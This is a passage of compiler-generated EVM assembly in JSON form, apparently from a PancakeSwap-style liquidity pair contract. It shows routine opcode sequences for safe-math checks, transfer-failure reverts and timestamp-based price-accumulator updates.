											"end": 1839,
											"name": "DUP1"
										},
										{
											"begin": 1823,
											"end": 1867,
											"name": "PUSH [tag]",
											"value": "322"
										},
										{
											"begin": 1823,
											"end": 1867,
											"name": "JUMPI"
										},
										{
											"begin": 1823,
											"end": 1867,
											"name": "POP"
										},
										{
											"begin": 1854,
											"end": 1858,
											"name": "DUP1"
										},
										{
											"begin": 1843,
											"end": 1867,
											"name": "DUP1"
										},
										{
											"begin": 1843,
											"end": 1867,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1843,
											"end": 1867,
											"name": "ADD"
										},
										{
											"begin": 1843,
											"end": 1867,
											"name": "SWAP1"
										},
										{
											"begin": 1843,
											"end": 1867,
											"name": "MLOAD"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "323"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "323"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 1843,
											"end": 1867,
											"name": "MLOAD"
										},
										{
											"begin": 1823,
											"end": 1867,
											"name": "tag",
											"value": "322"
										},
										{
											"begin": 1823,
											"end": 1867,
											"name": "JUMPDEST"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "PUSH [tag]",
											"value": "324"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "JUMPI"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "DUP1"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "DUP2"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "MSTORE"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "DUP3"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "ADD"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "MSTORE"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "PUSH",
											"value": "18"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "DUP3"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "ADD"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "MSTORE"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "PUSH",
											"value": "50616E63616B653A205452414E534645525F4641494C45440000000000000000"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "DUP3"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "ADD"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "MSTORE"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "SWAP1"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "MLOAD"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "SWAP1"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "DUP2"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "SWAP1"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "SUB"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "ADD"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "SWAP1"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "REVERT"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "tag",
											"value": "324"
										},
										{
											"begin": 1790,
											"end": 1918,
											"name": "JUMPDEST"
										},
										{
											"begin": 1587,
											"end": 1925,
											"name": "POP"
										},
										{
											"begin": 1587,
											"end": 1925,
											"name": "POP"
										},
										{
											"begin": 1587,
											"end": 1925,
											"name": "POP"
										},
										{
											"begin": 1587,
											"end": 1925,
											"name": "POP"
										},
										{
											"begin": 1587,
											"end": 1925,
											"name": "POP"
										},
										{
											"begin": 1587,
											"end": 1925,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 481,
											"end": 630,
											"name": "tag",
											"value": "168"
										},
										{
											"begin": 481,
											"end": 630,
											"name": "JUMPDEST"
										},
										{
											"begin": 539,
											"end": 548,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 568,
											"end": 574,
											"name": "DUP2"
										},
										{
											"begin": 568,
											"end": 574,
											"name": "ISZERO"
										},
										{
											"begin": 568,
											"end": 574,
											"name": "DUP1"
										},
										{
											"begin": 568,
											"end": 598,
											"name": "PUSH [tag]",
											"value": "326"
										},
										{
											"begin": 568,
											"end": 598,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 583,
											"end": 588,
											"name": "DUP1"
										},
										{
											"begin": 583,
											"end": 588,
											"name": "DUP3"
										},
										{
											"begin": 583,
											"end": 588,
											"name": "MUL"
										},
										{
											"begin": 597,
											"end": 598,
											"name": "DUP3"
										},
										{
											"begin": 592,
											"end": 593,
											"name": "DUP3"
										},
										{
											"begin": 583,
											"end": 588,
											"name": "DUP3"
										},
										{
											"begin": 592,
											"end": 593,
											"name": "DUP2"
										},
										{
											"begin": 578,
											"end": 593,
											"name": "PUSH [tag]",
											"value": "327"
										},
										{
											"begin": 578,
											"end": 593,
											"name": "JUMPI"
										},
										{
											"begin": 578,
											"end": 593,
											"name": "INVALID"
										},
										{
											"begin": 578,
											"end": 593,
											"name": "tag",
											"value": "327"
										},
										{
											"begin": 578,
											"end": 593,
											"name": "JUMPDEST"
										},
										{
											"begin": 578,
											"end": 593,
											"name": "DIV"
										},
										{
											"begin": 578,
											"end": 598,
											"name": "EQ"
										},
										{
											"begin": 568,
											"end": 598,
											"name": "tag",
											"value": "326"
										},
										{
											"begin": 568,
											"end": 598,
											"name": "JUMPDEST"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "PUSH [tag]",
											"value": "181"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "JUMPI"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "DUP1"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "DUP2"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "MSTORE"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "DUP3"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "ADD"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "MSTORE"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "PUSH",
											"value": "14"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "DUP3"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "ADD"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "64732D6D6174682D6D756C2D6F766572666C6F77"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "DUP3"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "ADD"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "MSTORE"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "SWAP1"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "MLOAD"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "SWAP1"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "DUP2"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "SWAP1"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "SUB"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "ADD"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "SWAP1"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "REVERT"
										},
										{
											"begin": 339,
											"end": 475,
											"name": "tag",
											"value": "170"
										},
										{
											"begin": 339,
											"end": 475,
											"name": "JUMPDEST"
										},
										{
											"begin": 431,
											"end": 436,
											"name": "DUP1"
										},
										{
											"begin": 431,
											"end": 436,
											"name": "DUP3"
										},
										{
											"begin": 431,
											"end": 436,
											"name": "SUB"
										},
										{
											"begin": 426,
											"end": 442,
											"name": "DUP3"
										},
										{
											"begin": 426,
											"end": 442,
											"name": "DUP2"
										},
										{
											"begin": 426,
											"end": 442,
											"name": "GT"
										},
										{
											"begin": 426,
											"end": 442,
											"name": "ISZERO"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH [tag]",
											"value": "181"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "JUMPI"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP2"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MSTORE"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP3"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "ADD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MSTORE"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "15"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP3"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "ADD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "64732D6D6174682D7375622D756E646572666C6F77"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "58"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP3"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "ADD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MSTORE"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MLOAD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP2"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SUB"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "ADD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "REVERT"
										},
										{
											"begin": 2834,
											"end": 3817,
											"name": "tag",
											"value": "179"
										},
										{
											"begin": 2834,
											"end": 3817,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2996,
											"end": 3019,
											"name": "DUP5"
										},
										{
											"begin": 2996,
											"end": 3019,
											"name": "GT"
										},
										{
											"begin": 2996,
											"end": 3019,
											"name": "DUP1"
										},
										{
											"begin": 2996,
											"end": 3019,
											"name": "ISZERO"
										},
										{
											"begin": 2996,
											"end": 3019,
											"name": "SWAP1"
										},
										{
											"begin": 2996,
											"end": 3046,
											"name": "PUSH [tag]",
											"value": "332"
										},
										{
											"begin": 2996,
											"end": 3046,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3023,
											"end": 3046,
											"name": "DUP4"
										},
										{
											"begin": 3023,
											"end": 3046,
											"name": "GT"
										},
										{
											"begin": 3023,
											"end": 3046,
											"name": "ISZERO"
										},
										{
											"begin": 2996,
											"end": 3046,
											"name": "tag",
											"value": "332"
										},
										{
											"begin": 2996,
											"end": 3046,
											"name": "JUMPDEST"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "PUSH [tag]",
											"value": "333"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "JUMPI"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "DUP1"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "DUP2"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "MSTORE"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "DUP3"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "ADD"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "MSTORE"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "PUSH",
											"value": "11"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "DUP3"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "ADD"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "50616E63616B653A204F564552464C4F57"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "78"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "DUP3"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "ADD"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "MSTORE"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "SWAP1"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "MLOAD"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "SWAP1"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "DUP2"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "SWAP1"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "SUB"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "ADD"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "SWAP1"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "REVERT"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "tag",
											"value": "333"
										},
										{
											"begin": 2975,
											"end": 3089,
											"name": "JUMPDEST"
										},
										{
											"begin": 3204,
											"end": 3222,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 3204,
											"end": 3222,
											"name": "SLOAD"
										},
										{
											"begin": 3130,
											"end": 3155,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 3130,
											"end": 3145,
											"name": "TIMESTAMP"
										},
										{
											"begin": 3130,
											"end": 3155,
											"name": "DUP2"
										},
										{
											"begin": 3130,
											"end": 3155,
											"name": "AND"
										},
										{
											"begin": 3130,
											"end": 3155,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3204,
											"end": 3222,
											"name": "SWAP1"
										},
										{
											"begin": 3204,
											"end": 3222,
											"name": "DIV"
										},
										{
											"begin": 3204,
											"end": 3222,
											"name": "DUP2"
										},
										{
											"begin": 3204,
											"end": 3222,
											"name": "AND"
										},
										{
											"begin": 3187,
											"end": 3222,
											"name": "DUP3"
										},
										{
											"begin": 3187,
											"end": 3222,
											"name": "SUB"
										},
										{
											"begin": 3187,
											"end": 3222,
											"name": "SWAP1"
										},
										{
											"begin": 3259,
											"end": 3274,
											"name": "DUP2"
										},
										{
											"begin": 3259,
											"end": 3274,
											"name": "AND"
										},
										{
											"begin": 3259,
											"end": 3274,
											"name": "ISZERO"
										},
										{
											"begin": 3259,
											"end": 3274,
											"name": "DUP1"
										},
										{
											"begin": 3259,
											"end": 3274,
											"name": "ISZERO"
										},
										{
											"begin": 3259,
											"end": 3274,
											"name": "SWAP1"
										},
										{
											"begin": 3259,
											"end": 3292,
											"name": "PUSH [tag]",
											"value": "335"
										},
										{
											"begin": 3259,
											"end": 3292,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3278,
											"end": 3292,
											"name": "DUP5"
										},
										{
											"begin": 3278,
											"end": 3292,
											"name": "AND"
										},
										{
											"begin": 3278,
											"end": 3292,
											"name": "ISZERO"
										},
										{
											"begin": 3278,
											"end": 3292,
											"name": "ISZERO"
										},
										{
											"begin": 3259,
											"end": 3292,
											"name": "tag",
											"value": "335"
										},
										{
											"begin": 3259,
											"end": 3292,
											"name": "JUMPDEST"
										},
										{
											"begin": 3259,
											"end": 3310,
											"name": "DUP1"
										},
										{
											"begin": 3259,
											"end": 3310,
											"name": "ISZERO"
										},
										{
											"begin": 3259,
											"end": 3310,
											"name": "PUSH [tag]",
											"value": "336"
										},
										{
											"begin": 3259,
											"end": 3310,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3296,
											"end": 3310,
											"name": "DUP4"
										},
										{
											"begin": 3296,
											"end": 3310,
											"name": "AND"
										},
										{
											"begin": 3296,
											"end": 3310,
											"name": "ISZERO"
										},
										{
											"begin": 3296,
											"end": 3310,
											"name": "ISZERO"
										},
										{
											"begin": 3259,
											"end": 3310,
											"name": "tag",
											"value": "336"
										},
										{
											"begin": 3259,
											"end": 3310,
											"name": "JUMPDEST"
										},
										{
											"begin": 3255,
											"end": 3651,
											"name": "ISZERO"
										},
										{
											"begin": 3255,
											"end": 3651,
											"name": "PUSH [tag]",
											"value": "337"
										},
										{
											"begin": 3255,
											"end": 3651,
											"name": "JUMPI"
										},
										{
											"begin": 3495,
											"end": 3506,
											"name": "DUP1"
										},
										{
											"begin": 3426,
											"end": 3506,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 3426,
											"end": 3506,
											"name": "AND"
										},
										{
											"begin": 3431,
											"end": 3475,
											"name": "PUSH [tag]",
											"value": "338"
										},
										{
											"begin": 3465,
											"end": 3474,
											"name": "DUP6"
										},
										{
											"begin": 3431,
											"end": 3458,
											"name": "PUSH [tag]",
											"value": "339"
										},
										{
											"begin": 3448,
											"end": 3457,
											"name": "DUP7"
										},
										{
											"begin": 3431,
											"end": 3447,
											"name": "PUSH [tag]",
											"value": "340"
										},
										{
											"begin": 3431,
											"end": 3458,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3431,
											"end": 3458,
											"name": "tag",
											"value": "339"
										},
										{
											"begin": 3431,
											"end": 3458,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3431,
											"end": 3464,
											"name": "AND"
										},
										{
											"begin": 3431,
											"end": 3464,
											"name": "SWAP1"
										},
										{
											"begin": 3431,
											"end": 3475,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 3431,
											"end": 3464,
											"name": "PUSH [tag]",
											"value": "341"
										},
										{
											"begin": 3431,
											"end": 3475,
											"name": "AND"
										},
										{
											"begin": 3431,
											"end": 3475,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3431,
											"end": 3475,
											"name": "tag",
											"value": "338"
										},
										{
											"begin": 3431,
											"end": 3475,
											"name": "JUMPDEST"
										},
										{
											"begin": 3386,
											"end": 3406,
											"name": "PUSH",
											"value": "C"
										},
										{
											"begin": 3386,
											"end": 3506,
											"name": "DUP1"
										},
										{
											"begin": 3386,
											"end": 3506,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3426,
											"end": 3476,
											"name": "SWAP3"
										},
										{
											"begin": 3426,
											"end": 3476,
											"name": "SWAP1"
										},
										{
											"begin": 3426,
											"end": 3476,
											"name": "SWAP3"
										},
										{
											"begin": 3426,
											"end": 3476,
											"name": "AND"
										},
										{
											"begin": 3426,
											"end": 3506,
											"name": "SWAP3"
										},
										{
											"begin": 3426,
											"end": 3506,
											"name": "SWAP1"
										},
										{
											"begin": 3426,
											"end": 3506,
											"name": "SWAP3"
										},
										{
											"begin": 3426,
											"end": 3506,
											"name": "MUL"
										},
										{
											"begin": 3386,
											"end": 3506,
											"name": "ADD"
										},
										{
											"begin": 3386,
											"end": 3506,
											"name": "SWAP1"
										},
										{
											"begin": 3386,
											"end": 3506,
											"name": "SSTORE"
										},
										{
											"begin": 3560,
											"end": 3640,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 3560,
											"end": 3640,
											"name": "DUP2"
										},
										{
											"begin": 3560,
											"end": 3640,
											"name": "AND"
										},
										{
											"begin": 3565,
											"end": 3609,
											"name": "PUSH [tag]",
											"value": "342"
										},
										{
											"begin": 3599,
											"end": 3608,
											"name": "DUP5"
										},
										{
											"begin": 3565,
											"end": 3592,
											"name": "PUSH [tag]",
											"value": "339"
										},
										{
											"begin": 3582,
											"end": 3591,
											"name": "DUP8"
										},
										{
											"begin": 3565,
											"end": 3581,
											"name": "PUSH [tag]",
											"value": "340"
										},
										{
											"begin": 3565,
											"end": 3592,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3565,
											"end": 3609,
											"name": "tag",
											"value": "342"
										},
										{
											"begin": 3565,
											"end": 3609,
											"name": "JUMPDEST"
										},
										{
											"begin": 3520,
											"end": 3540,
											"name": "PUSH",
											"value": "D"
										},
										{
											"begin": 3520,
											"end": 3640,
											"name": "DUP1"
										},
										{
											"begin": 3520,
											"end": 3640,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3560,
											"end": 3610,
											"name": "SWAP3"
										},
										{
											"begin": 3560,
											"end": 3610,
											"name": "SWAP1"
										},
										{
											"begin": 3560,
											"end": 3610,
											"name": "SWAP3"
										},
										{
											"begin": 3560,
											"end": 3610,
											"name": "AND"
										},
										{
											"begin": 3560,
											"end": 3640,
											"name": "SWAP3"
										},
										{
											"begin": 3560,
											"end": 3640,
											"name": "SWAP1"
										},
										{
											"begin": 3560,
											"end": 3640,
											"name": "SWAP3"
										},
										{
											"begin": 3560,
											"end": 3640,
											"name": "MUL"
										},
										{
											"begin": 3520,
											"end": 3640,
											"name": "ADD"
										},
										{
											"begin": 3520,
											"end": 3640,
											"name": "SWAP1"
										},
										{
											"begin": 3520,
											"end": 3640,
											"name": "SSTORE"
										},
										{
											"begin": 3255,
											"end": 3651,
											"name": "tag",
											"value": "337"
										},
										{
											"begin": 3255,
											"end": 3651,
											"name": "JUMPDEST"
										},
										{
											"begin": 3660,
											"end": 3668,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 3660,
											"end": 3688,
											"name": "DUP1"
										},
										{
											"begin": 3660,
											"end": 3688,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 3660,
											"end": 3688,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3660,
											"end": 3688,
											"name": "DUP9"
										},
										{
											"begin": 3660,
											"end": 3688,
											"name": "DUP2"
										},
										{
											"begin": 3660,
											"end": 3688,
											"name": "AND"
										},
										{
											"begin": 3660,
											"end": 3688,
											"name": "SWAP2"
										},
										{
											"begin": 3660,
											"end": 3688,
											"name": "SWAP1"
										},
										{
											"begin": 3660,
											"end": 3688,
											"name": "SWAP2"
										},
										{
											"begin": 3660,
											"end": 3688,
											"name": "OR"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
